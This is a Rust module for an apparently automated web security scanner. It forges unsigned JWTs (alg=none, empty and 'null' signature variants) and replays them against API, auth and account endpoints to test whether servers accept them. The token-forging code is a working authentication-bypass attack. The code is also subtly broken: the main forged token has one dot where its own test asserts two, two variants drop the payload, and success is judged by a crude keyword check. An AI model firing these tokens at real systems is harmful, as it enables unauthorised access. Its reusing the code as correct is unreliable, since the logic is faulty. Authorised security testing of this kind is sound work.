//! JWT alg=none Bypass Detection Module
//! Detects JWT signature bypass by removing signatures and observing acceptance.

use crate::checks::module::{CheckModule, CheckResult, CheckMetadata, CheckCategory};
use crate::findings::finding::Finding;
use crate::session::session::Session;
use crate::http::client::HttpClient;
use crate::learning::access_cache::AccessCache;
use std::sync::Arc;

/// JWT none bypass detector
pub struct JwtNoneDetector {
    http_client: Arc<HttpClient>,
    access_cache: Arc<AccessCache>,
}

impl JwtNoneDetector {
    pub fn new(http_client: Arc<HttpClient>, access_cache: Arc<AccessCache>) -> Self {
        Self {
            http_client,
            access_cache,
        }
    }

    /// Decode base64url without padding
    fn decode_base64url(&self, input: &str) -> Option<Vec<u8>> {
        let mut padded = input.to_string();
        while padded.len() % 4 != 0 {
            padded.push('=');
        }
        base64::decode_config(&padded, base64::URL_SAFE).ok()
    }

    /// Encode to base64url without padding
    fn encode_base64url(&self, data: &[u8]) -> String {
        base64::encode_config(data, base64::URL_SAFE_NO_PAD)
    }

    /// Create a JWT with alg=none
    fn create_none_jwt(&self, header_payload: &str) -> String {
        let none_header = self.encode_base64url(b"{\"alg\":\"none\",\"typ\":\"JWT\"}");
        format!("{}.{}", none_header, header_payload)
    }

    /// Create a JWT with empty signature
    fn create_empty_signature_jwt(&self, header_payload: &str) -> String {
        let none_header = self.encode_base64url(b"{\"alg\":\"none\",\"typ\":\"JWT\"}");
        format!("{}..", none_header)
    }

    /// Create a JWT with "null" signature
    fn create_null_signature_jwt(&self, header_payload: &str) -> String {
        let none_header = self.encode_base64url(b"{\"alg\":\"none\",\"typ\":\"JWT\"}");
        format!("{}.null", none_header)
    }

    /// Test JWT none bypass on an endpoint
    async fn test_none_bypass(
        &self,
        session: &Session,
        endpoint: &str,
        original_token: &str,
    ) -> Option<Finding> {
        // Extract payload from original token
        let parts: Vec<&str> = original_token.split('.').collect();
        if parts.len() != 3 {
            return None;
        }

        let payload = parts[1];
        
        // Test variants of alg=none attack
        let test_tokens = vec![
            ("none", self.create_none_jwt(payload)),
            ("empty_signature", self.create_empty_signature_jwt(payload)),
            ("null_signature", self.create_null_signature_jwt(payload)),
        ];

        for (variant, token) in test_tokens {
            let response = self.http_client
                .get(endpoint)
                .session(&session.clone_with_token(&token))
                .send()
                .await;

            if response.status().is_success() {
                let body = response.body();
                
                // Check if server accepted the unsigned token
                if !body.contains("invalid")
                    && !body.contains("signature")
                    && !body.contains("unauthorized")
                    && !body.contains("forbidden")
                    && !body.is_empty()
                {
                    return Some(Finding::new()
                        .with_title("JWT: alg=none Bypass Successful")
                        .with_description(format!(
                            "Server accepts JWT with alg=none at {} (variant: {})",
                            endpoint, variant
                        ))
                        .with_endpoint(endpoint)
                        .with_severity(crate::findings::severity::Severity::Critical)
                        .with_evidence(format!(
                            "Token variant: {}, Response: {}",
                            variant,
                            &body[..body.len().min(200)]
                        )));
                }
            }
        }

        None
    }

    /// Scan for JWT none bypass vulnerabilities
    pub async fn scan(&self, sessions: &[Session], endpoints: &[String]) -> Vec<CheckResult> {
        let mut results = Vec::new();

        for session in sessions {
            if let Some(token) = session.jwt_token() {
                for endpoint in endpoints {
                    // Focus on authenticated endpoints
                    if endpoint.contains("api") 
                        || endpoint.contains("auth")
                        || endpoint.contains("user")
                        || endpoint.contains("account")
                        || endpoint.contains("profile")
                    {
                        if let Some(finding) = self.test_none_bypass(session, endpoint, token).await {
                            results.push(CheckResult::Finding(finding));
                            
                            // Cache the vulnerable pattern
                            self.access_cache.cache_jwt_weakness(
                                "alg_none".to_string(),
                                endpoint.clone(),
                            );
                            
                            break; // One finding per session is enough
                        }
                    }
                }
            }
        }

        results
    }
}

impl CheckModule for JwtNoneDetector {
    fn metadata(&self) -> CheckMetadata {
        CheckMetadata {
            name: "jwt_none_detector".to_string(),
            category: CheckCategory::AccessControl,
            description: "Detects JWT alg=none signature bypass".to_string(),
            version: "1.0.0".to_string(),
        }
    }

    async fn execute(&self, context: &crate::orchestrator::graph::ScanContext) -> Vec<CheckResult> {
        let sessions = context.sessions();
        let endpoints = context.endpoints();
        self.scan(sessions, endpoints).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64url_encoding() {
        let cache = Arc::new(AccessCache::new());
        let client = Arc::new(HttpClient::default());
        let detector = JwtNoneDetector::new(client, cache);

        let data = b"test data";
        let encoded = detector.encode_base64url(data);
        let decoded = detector.decode_base64url(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_none_jwt_creation() {
        let cache = Arc::new(AccessCache::new());
        let client = Arc::new(HttpClient::default());
        let detector = JwtNoneDetector::new(client, cache);

        let payload = detector.encode_base64url(b"{\"sub\":\"user\"}");
        let jwt = detector.create_none_jwt(&payload);
        
        assert!(jwt.starts_with("eyJhbG"));
        assert!(jwt.contains("..") == false); // Should have two dots
        assert_eq!(jwt.matches('.').count(), 2);
    }
}
